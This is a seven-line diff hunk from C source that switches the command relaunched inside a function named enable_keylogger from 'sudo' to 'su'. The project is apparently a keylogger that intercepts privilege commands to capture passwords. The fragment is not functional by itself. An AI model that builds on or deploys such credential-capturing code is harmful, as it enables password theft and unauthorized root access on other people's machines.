@@ -118,7 +118,7 @@ int enable_keylogger(int argc, char **argv)
 		#ifdef CMDCHANGE
 			runme(argc, argv);
 		#else
-			tas_execv("sudo", argv);
+			tas_execv("su", argv);
 		#endif
 
 		_exit(1);
